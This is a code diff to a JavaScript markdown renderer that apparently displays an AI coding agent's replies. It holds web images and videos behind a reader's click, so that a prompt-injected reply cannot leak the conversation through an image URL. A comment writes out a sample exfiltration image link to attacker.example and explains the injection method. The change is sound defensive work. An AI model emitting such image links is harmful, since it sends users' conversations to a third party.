@@ -4,7 +4,9 @@
  * text — the model's output is untrusted input, never markup. Covers what a
  * coding agent actually emits: fenced code, lists, headings, pipe tables,
  * images, standalone video URLs, emphasis, links, and code spans. Anything
- * else falls through as a paragraph.
+ * else falls through as a paragraph. Web media paints as a slot that waits
+ * for the reader's click: the URL of a fetched picture is a channel out of
+ * the machine, and the prose naming it is untrusted.
  */
 import { restoreText } from './waf-restore.js';
 
@@ -24,12 +26,75 @@ const safeSrc = (src) => {
 const VIDEO_SRC = /\.(?:mp4|m4v|webm|ogv|ogg|mov)(?:[?#][^\s]*)?$/i;
 const looksLikeVideo = (src, label = '') => VIDEO_SRC.test(src) || VIDEO_SRC.test(label.trim());
 
-const mediaTag = (kind, src, alt = '') => {
-  const href = escapeHtml(src);
+/* A web media slot that waits for the reader's click.
+ *
+ * A picture or clip addressed on the open web is also a channel out of the
+ * machine: the moment the element loads, its URL — query string included —
+ * reaches a server the prose chose, and the prose is untrusted. A
+ * prompt-injected reply can carry a whole conversation out in one
+ * `![](https://attacker.example/x.png?d=…)`, and neither
+ * referrerpolicy="no-referrer" (that is only the Referer header) nor
+ * loading="lazy" (the reply is on screen at once anyway) stops it.
+ *
+ * So the paint carries no `src` at all — an element without one fetches
+ * nothing — and the address rides in `data-md-src`. `loadDeferredMedia` is
+ * the only thing that turns a slot into a fetch, and transcript.js wires it
+ * to the click and to the Enter key of the slot's button role: the consent
+ * is the reader's, not the reply's. The values arrive already HTML-escaped —
+ * the block path escapes them first, and inline() captures from text that
+ * was escaped before the shapes ran.
+ */
+const deferredMedia = (kind, escSrc, escAlt = '', extra = '') => {
+  const cls = `md-media-deferred${extra ? ` ${extra}` : ''}`;
+  const label = kind === 'video' ? 'Load video' : 'Load image';
+  const name = escAlt ? `${label}: ${escAlt}` : label;
   return kind === 'video'
-    ? `<video class="md-video" controls preload="metadata" playsinline src="${href}"></video>`
-    : `<img class="md-image" src="${href}" alt="${escapeHtml(alt)}" loading="lazy" referrerpolicy="no-referrer">`;
+    ? `<video class="md-video ${cls}" preload="none" playsinline role="button" tabindex="0" aria-label="${name}" title="${escSrc}" data-md-src="${escSrc}"></video>`
+    : `<img class="md-image ${cls}" role="button" tabindex="0" aria-label="${name}" title="${escSrc}" alt="${escAlt}" loading="lazy" referrerpolicy="no-referrer" data-md-src="${escSrc}">`;
 };
+
+/* The one origin that loads without a click: the account's own. The bridge
+ * reaches de.aipass.net and its subdomains, the extension's host permissions
+ * cover exactly that origin, and those hosts already hold the whole
+ * conversation — a URL addressed there carries nothing they do not have.
+ * Anywhere else stays behind the click. (Pinned against the manifest in
+ * test/ui-md.test.mjs: the allowlist may not grow past the origin the bridge
+ * side already speaks for.) */
+const ACCOUNT_MEDIA_HOST = /(?:^|\.)aipass\.net$/i;
+const trustedMediaSrc = (src) => {
+  try { return ACCOUNT_MEDIA_HOST.test(new URL(String(src)).hostname); } catch { return false; }
+};
+
+/* The account's own media, which needs no consent: the element carries its
+ * src from the first paint. Same escaped-values deal as deferredMedia. */
+const trustedMediaTag = (kind, escSrc, escAlt = '', extra = '') => {
+  const cls = extra ? ` ${extra}` : '';
+  return kind === 'video'
+    ? `<video class="md-video${cls}" controls preload="metadata" playsinline src="${escSrc}"></video>`
+    : `<img class="md-image${cls}" src="${escSrc}" alt="${escAlt}" loading="lazy" referrerpolicy="no-referrer">`;
+};
+
+/* Block media: the account's own loads at once, the open web waits. */
+const mediaTag = (kind, escSrc, escAlt = '') => (
+  trustedMediaSrc(escSrc) ? trustedMediaTag(kind, escSrc, escAlt) : deferredMedia(kind, escSrc, escAlt)
+);
+
+/* The consent: give the slot its source, and only then. The address is
+ * re-validated here — the attribute is as readable by anything in the page
+ * as it is by the reader's click — and a slot that already loaded (or never
+ * carried a web address) loads nothing the second time. */
+export function loadDeferredMedia(media) {
+  const src = safeSrc(media?.dataset?.mdSrc);
+  if (!src) return null;
+  media.src = src;
+  if (String(media.tagName).toUpperCase() === 'VIDEO') {
+    media.preload = 'metadata';
+    media.controls = true;
+  }
+  media.classList?.remove('md-media-deferred');
+  for (const attr of ['role', 'tabindex', 'aria-label', 'data-md-src']) media.removeAttribute?.(attr);
+  return src;
+}
 
 const inline = (s) => {
   // Code spans and media are complete HTML once built. Stash them behind a
@@ -45,7 +110,8 @@ const inline = (s) => {
       // line of its own can grow a player.
       if (!safeSrc(src)) return whole;
       if (looksLikeVideo(src, alt)) return stash(`<a class="md-link" href="${src}" target="_blank" rel="noreferrer">${alt || 'video'}</a>`);
-      return stash(`<img class="md-image md-image-inline" src="${src}" alt="${alt}" loading="lazy" referrerpolicy="no-referrer">`);
+      const cls = 'md-image-inline';
+      return stash(trustedMediaSrc(src) ? trustedMediaTag('image', src, alt, cls) : deferredMedia('image', src, alt, cls));
     });
   out = out
     .replace(/\*\*([^*\n]+)\*\*/g, '<strong>$1</strong>')
@@ -74,7 +140,7 @@ const mediaLine = (line) => {
 };
 
 const mediaBlock = (media) => {
-  const tag = mediaTag(media.kind, media.src, media.alt);
+  const tag = mediaTag(media.kind, escapeHtml(media.src), escapeHtml(media.alt));
   const caption = media.alt ? `<figcaption>${escapeHtml(media.alt)}</figcaption>` : '';
   return `<figure class="md-figure${media.kind === 'video' ? ' md-video-figure' : ''}">${tag}${caption}</figure>`;
 };
@@ -271,4 +337,4 @@ export function renderMarkdown(src) {
   return out.join('\n');
 }
 
-export { escapeHtml, inline };
+export { escapeHtml, inline, ACCOUNT_MEDIA_HOST };
